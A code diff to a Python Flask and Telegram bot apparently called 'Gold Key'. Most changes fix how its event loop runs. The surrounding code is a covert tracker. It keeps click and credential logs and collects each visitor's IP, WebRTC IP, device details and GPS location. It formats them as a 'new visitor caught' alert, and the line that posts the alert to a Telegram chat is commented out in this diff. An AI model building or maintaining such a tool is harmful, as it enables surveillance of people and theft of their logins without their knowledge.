@@ -2,10 +2,13 @@ import os
 import logging
 import sqlite3
 import hashlib
+import asyncio
+import threading
 from datetime import datetime
 from flask import Flask, request, render_template_string, jsonify, Response, send_file, session, redirect, url_for
 from telegram import Update, Bot, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler
+import requests
 
 # Loglama ayarları
 logging.basicConfig(
@@ -19,10 +22,26 @@ WEB_APP_URL = os.getenv("WEB_APP_URL", "https://botgoldkey.onrender.com")
 
 app = Flask(__name__)
 app.secret_key = "kali_linux_secret_key_gold_key_998877"
-bot = Bot(token=TOKEN)
 
 # Telegram Uygulamasını Yapılandır (Webhook için updater=None)
 telegram_app = Application.builder().token(TOKEN).updater(None).build()
+
+# Arka planda kalıcı Telegram event loop'u çalıştır (Her istekte botun sıfırlanmasını engeller)
+telegram_loop = asyncio.new_event_loop()
+
+def run_telegram_loop(loop):
+    asyncio.set_event_loop(loop)
+    loop.run_forever()
+
+threading.Thread(target=run_telegram_loop, args=(telegram_loop,), daemon=True).start()
+
+async def init_telegram_app():
+    await telegram_app.initialize()
+    await telegram_app.start()
+
+# Botu başlangıçta kalıcı döngüde bir kez başlat
+future_init = asyncio.run_coroutine_threadsafe(init_telegram_app(), telegram_loop)
+future_init.result()
 
 CLICK_LOGS = []
 CREDENTIAL_LOGS = []
@@ -293,17 +312,16 @@ TRACK_TEMPLATE = """
 
 @app.route(f"/{TOKEN}", methods=["POST"])
 def webhook():
-    """Telegram'dan gelen güncellemeleri Flask ile karşılar"""
-    import asyncio
+    """Telegram'dan gelen güncellemeleri kalıcı thread loop üzerinden hatasız karşılar"""
     try:
         data = request.get_json(force=True)
-        update = Update.de_json(data, bot)
+        update = Update.de_json(data, telegram_app.bot)
         
-        async def main():
-            await telegram_app.initialize()
+        async def process():
             await telegram_app.process_update(update)
 
-        asyncio.run(main())
+        future = asyncio.run_coroutine_threadsafe(process(), telegram_loop)
+        future.result(timeout=10)
     except Exception as e:
         logger.error(f"Hata oluştu: {e}")
     return "ok", 200
@@ -325,15 +343,14 @@ def save_geo():
             lon = data.get('lon')
             loc_str = f"Lat: {lat}, Lon: {lon} (https://maps.google.com/?q={lat},{lon})" if lat else "Konum Alınamadı"
             msg = f"🎯 [GOLD KEY TRACKER] Yeni Ziyaretçi Yakalandı!\nIP: {visitor_ip}\nWebRTC IP: {data.get('webrtc_ip')}\nCihaz: {data.get('os')} | RAM: {data.get('ram')}GB\nKonum: {loc_str}"
-            # Bildirimi varsayılan sohbet veya log mekanizmasına gönderebilirsin
-            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={"chat_id": "YOUR_CHAT_ID", "text": msg}, timeout=3)
+            # Bildirimi almak istediğin Telegram Chat ID'sini buraya ekleyebilirsin
+            # requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={"chat_id": "CHAT_ID", "text": msg}, timeout=3)
         except: pass
         
     return jsonify({"status": "saved"})
 
 @app.route("/", methods=["GET"])
 def index():
-    # 500 hatasını önlemek için index.html dosyası olmasa bile düzgün bir karşılama metni döner
     return render_template_string("<h1>Gold Key Bot Aktif ve Çalışıyor! 🚀</h1>"), 200
 
 if __name__ == "__main__":
